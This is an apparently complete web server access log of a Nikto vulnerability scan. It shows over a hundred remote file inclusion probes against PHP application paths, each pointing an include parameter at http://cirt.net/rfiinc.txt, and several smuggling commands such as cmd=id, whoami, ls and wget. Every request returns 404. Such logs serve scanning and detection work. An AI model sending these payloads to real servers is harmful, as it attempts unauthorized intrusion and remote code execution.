172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dbmodules/DB_adodb.class.php?PHPOF_INCLUDE_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004615)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /debugger.php?config_atkroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004616)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /decoder/gallery.php?ccms_library_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004617)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /decoder/markdown.php?ccms_library_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004618)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /defaults_setup.php?ROOT_PATH=http://cirt.net/rfiinc.txt??cmd=ls HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004619)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /defines.php?WEBCHATPATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004620)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /demo/ms-pe02/catalog.php?cid=0&sid='%22&sortfield=title&sortorder=ASC&pagenumber=1&main=http://cirt.net/rfiinc.txt?& HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004621)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /depouilg.php3?NomVote=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004622)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /development.php?root_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004623)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /development.php?root_prefix=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004624)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dfcode.php?DFORUM_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004625)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.list.php?set_depth=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 571 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004626)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.search.php?set_depth=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 573 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004627)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 559 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004628)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 559 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004629)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dialog.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004630)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dialogs/a.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004631)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dialogs/collorpicker.php?spaw_dir=http://cirt.net/rfiinc.txt?&cmd=id HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004632)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dialogs/img.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004633)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dialogs/img_library.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004634)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dialogs/table.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004635)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dialogs/td.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004636)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /digitaleye_Path/module.php?menu=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004637)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dir/prepend.php?_PX_config[manager_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004638)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dir_thatware/config.php?root_path=http://cirt.net/rfiinc.txt?' HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004639)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /direct.php?rf=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004640)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /direction/index.php?repertoire_config=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004641)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /directory/index.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004642)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /display.php?pag=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004643)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /display.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004644)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /displayCategory.php?basepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004645)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dix.php3?url_phpartenaire=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004646)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dm-albums/template/album.php?SECURITY_FILE=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004647)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /doc/admin/index.php?ptinclude=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004648)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /doceboCore/lib/lib.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004649)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /doceboKms/modules/documents/lib.filelist.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004650)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /doceboKms/modules/documents/tree.documents.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004651)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /doceboLms/lib/lib.repo.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004652)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /doceboScs/lib/lib.teleskill.php?GLOBALS[where_scs]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004653)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /docebocms/lib/lib.simplesel.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004654)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /docs/front-end-demo/cart2.php?workdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004655)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dokeos/claroline/resourcelinker/resourcelinker.inc.php?clarolineRepositorySys=http://cirt.net/rfiinc.txt??&cmd=wget%20XXpathXX HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004656)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dosearch.php?RESPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004657)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /download.php?root_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004658)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /download.php?root_prefix=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004659)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /download_engine_V1.4.3/addmember.php?eng_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004660)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /download_engine_V1.4.3/admin/enginelib/class.phpmailer.php?lang_pathr=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004661)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /download_engine_V1.4.3/admin/includes/spaw/dialogs/colorpicker.php?spaw_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 557 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004662)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /downstat1.8/chart.php?art=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004663)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /dp_logs.php?HomeDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004664)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /eXPerience2/modules.php?file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004665)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /ea-gBook/index_inc.php?inc_ordner=http://cirt.net/rfiinc.txt??&act=cmd&cmd=whoami&d=/&submit=1&cmd_txt=1 HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004666)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /edit.php?javascript_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004667)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /editor.php?newsfile=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004668)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /editprofile.php?pathtohomedir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004669)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /editsite.php?returnpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004670)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /editx/add_address.php?include_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004671)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/contenus.php?contenus=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004672)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/moduleajouter/articles/fonctions.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004673)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/moduleajouter/articles/usrarticles.php?corpsdesign=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004674)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/moduleajouter/depot/fonctions.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004675)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/moduleajouter/depot/usrdepot.php?corpsdesign=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004676)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/moduleajouter/depot/usrdepot.php?corpsdesignhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004677)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/utilisateurs/coeurusr.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004678)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/utilisateurs/commentaire.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004679)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/utilisateurs/enregistrement.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004680)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/utilisateurs/espaceperso.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004681)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /elseif/utilisateurs/votes.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004682)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /email_subscribe.php?root_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004683)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /email_subscribe.php?root_prefix=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004684)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /embed/day.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004685)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /enc/content.php?Home_Path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004686)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /engine/Ajax/editnews.php?root_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004687)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /engine/api/api.class.php?dle_config_api=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004688)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /engine/engine.inc.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004689)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /engine/init.php?root_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004690)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /engine/require.php?MY_ENV[BASE_ENGINE_LOC]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004691)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /enth3/show_joined.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004692)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /environment.php?DIR_PREFIX=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004693)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /epal/index.php?view=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004694)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /errors.php?error=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004695)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /errors/configmode.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004696)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /errors/reconfigure.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004698)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /errors/unconfigured.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004699)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /es_custom_menu.php?files_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004700)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /es_desp.php?files_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004701)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /es_offer.php?files_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004702)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /eshow.php?Config_rootdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004703)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /esupport/admin/autoclose.php?subd=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004704)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /eva/index.php3?aide=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004705)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /eva/index.php3?aide=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004706)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /eva/index.php3?perso=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004707)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /eva/index.php?eva[caminho]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004708)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /event.php?myevent_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 464 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004709)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /event_cal/module/embed/day.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004710)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /eventcal2.php.php?path_simpnews=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004711)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /eventscroller.php?path_simpnews=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004712)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /example-view/templates/article.php?globals[content_dir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004713)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /example-view/templates/dates_list.php?globals[content_dir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004714)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /example-view/templates/root.php?globals[content_dir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004715)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /example.php?site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004716)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /example/gamedemo/inc.functions.php?projectPath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004717)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /examplefile.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004718)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /examples/patExampleGen/bbcodeSource.php?example=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004719)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /exception/include.php?_APP_RELATIVE_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004720)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /extauth/drivers/ldap.inc.php?clarolineRepositorySys=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004721)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /extras/mt.php?web_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004722)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /extras/poll/poll.php?file_newsportal=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004723)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /ezusermanager_pwd_forgott.php?ezUserManager_Path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004724)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /faq.php?module_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004725)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /faq.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004726)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /fckeditor/editor/dialog/fck_link.php?dirroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004727)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Dirroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 564 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004728)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?dirroot=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 564 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004729)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /fcring.php?s_fuss=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004730)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /feed.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004731)"
